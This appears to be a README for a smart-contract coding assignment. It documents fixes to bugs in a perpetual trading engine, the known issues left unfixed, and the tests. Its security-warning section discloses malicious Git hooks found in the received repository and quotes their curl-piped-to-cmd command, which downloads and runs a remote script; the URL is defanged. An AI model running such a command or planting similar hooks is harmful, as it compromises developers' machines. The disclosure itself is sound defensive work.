# LeverUp Perp Engine: Security Fixes

This repository contains my submission for the LeverUp smart contract coding assignment. The task was to find and fix correctness and security bugs in a small perpetual position engine with the smallest reasonable patch.

- **Result:** 26 tests pass on a local Hardhat network. Against the original contracts, 18 of the same 26 tests failed.
- **Not done:** nothing was deployed, and no external audit or static analysis was run.
- **AI use:** this work was completed with AI assistance from Claude, which is credited in the commits.

## Run the tests

```bash
npm install
npm test
```

## Security warning: malicious Git hooks

The repository I received contained three Git hooks that download and run a remote script: `post-checkout`, `pre-commit`, and `pre-push`. On Windows, the script runs:

```sh
curl -s https://chgver[.]s[.]gy/707w -L | cmd > /dev/null 2>&1 &
```

The URL is deliberately broken here so it can't be clicked. Each hook also has download links for macOS and Linux.

The brief's required `git checkout` and `git commit` steps would trigger these hooks. Hooks aren't tracked by Git, so `git status` still shows a clean repo.

I worked from a clean clone, which doesn't copy hooks, and did not open the URL, so I don't know what the script does or who added it. **This repository does not contain those hooks.** Anyone holding the original copy should avoid running those Git commands in it. Copying it with `git clone --no-local` leaves the hooks behind.

## Issues and fixes

### Oracle

| Severity | Issue | Impact | Fix |
|---|---|---|---|
| Critical | Anyone could call `setPrice` and `setPriceAndTimestamp` | An attacker could set any price, then take profit from the pool or force liquidations | Both setters are now owner-only |
| High | The engine ignored `updatedAt` | Positions could be opened, closed, or liquidated at old prices | A new `_getPrice()` rejects prices that are zero, future-dated, or over 60 seconds old |

### Leverage

| Severity | Issue | Impact | Fix |
|---|---|---|---|
| Critical | Positions at 182x or above were below maintenance as soon as they opened | Anyone could liquidate them immediately. At 1001x, a 1,000 USDC position has 499.5 USDC of margin after fees but needs 5,005 USDC of maintenance | Positions that would be liquidatable at open are rejected with `InvalidLeverage` |

### Liquidation

| Severity | Issue | Impact | Fix |
|---|---|---|---|
| High | Remaining equity was never returned to the trader | Traders lost all equity beyond the liquidator's reward | The trader now receives `equity - reward` |
| High | The reward was based on margin and not capped at equity | Underwater positions still paid out, so traders could liquidate themselves to recover 5% instead of closing for nothing | The reward is capped at equity, so self-liquidating is never better than closing |
| Medium | Positions exactly at maintenance could be liquidated | The brief allows liquidation only below maintenance | The check changed from `equity > maintenance` to `equity >= maintenance` |

### Fees

| Severity | Issue | Impact | Fix |
|---|---|---|---|
| Medium | Fees weren't tracked and couldn't be withdrawn | Fees mixed silently into the pool | Added `accruedFees` and an owner-only `withdrawFees` |
| Medium | Fees rounded down | Notionals under 2,000 base units paid no fee | Fees and maintenance now round up, in the protocol's favor |
| Low | `PositionOpened` reported margin before fees | The event didn't match the stored position | The event now reports margin after fees |

### Token handling and state

| Severity | Issue | Impact | Fix |
|---|---|---|---|
| Medium | `openPosition` pulled collateral before writing state | A token with callbacks could reenter during the transfer | State is now written first |
| Medium | Transfers required a `bool` return value | Tokens that return no value, such as USDT, couldn't be used | A new `_callToken` accepts `true` or no return value, and rejects `false` or an address with no code |
| Low | The constructor accepted zero addresses | The contract could be deployed in an unusable state | Zero addresses now revert with `InvalidAddress` |

## Reviewed with no bug found

- Long and short PnL have the correct direction.
- Price and token decimals cancel out in the PnL ratio, so no conversion is needed. `PRICE_DECIMALS` and `TOKEN_DECIMALS` are unused.
- The fee can't exceed margin. Its maximum is about 50.05%, at 1001x.
- `closePosition` and `liquidate` delete the position before transferring funds.
- Users can't open or close another user's position.

## Decisions to confirm

- **Leverage limit:** the brief asks for up to 1001x with 0.5% maintenance and a 0.05% fee on notional, but positions at 182x or above are liquidatable at open under those settings. I kept the settings and rejected those positions, so the effective limit is 181x. `MAX_LEVERAGE` remains 1001. Supporting 1001x would need different maintenance and fee settings.
- **Maximum price age:** I chose 60 seconds because the brief only says "reasonably fresh."
- **Close fee:** the fee is charged on open only, because the brief doesn't mention one on close.
- **Event signature:** `PositionLiquidated` gained a `returnedMargin` field, which changes the event signature for anything reading it.

## Known issues not fixed

| Severity | Issue | Why it remains |
|---|---|---|
| Critical | Winners are paid from other traders' margin, and fee withdrawals draw on the same balance. The pool can run out, and later closes then revert | A proper fix needs a vault or liquidity pool, which is beyond a minimal patch |
| Medium | A trader who can't receive tokens, such as a blacklisted address, can block their own liquidation because the refund fails | The fix is to let traders claim refunds separately, which adds a new flow |
| Medium | Positions with zero equity or margin under 20 base units pay no reward, so nobody is paid to clear them | The fix needs a policy decision, such as a minimum position size or an insurance fund |
| Low | `MockUSDC.mint` is open to anyone | It is a test token |
| Low | Fee-on-transfer tokens aren't supported | Margin assumes the full amount arrives. The brief's collateral is a 6-decimal USDC-style token |
| Low | Short PnL can round up to 1 base unit in the trader's favor | The effect is negligible, so I avoided the extra change |

## Tests

The tests are in `test/PerpEngine.test.js`, and they were written and run against the original contracts before the fixes. They cover the failure cases above, including bad prices, unauthorized calls, the 181x and 182x boundary, liquidation exactly at maintenance, and failed collateral transfers. `test/TestToken.sol` is a helper token that returns no value.

## Timing

`START` and `DONE` were committed at 21:38:11 and 21:56:26 (UTC+5) on November 2, 2026, for 18 minutes 15 seconds. This README was added in a later commit, so `DONE` isn't the latest commit on this branch.
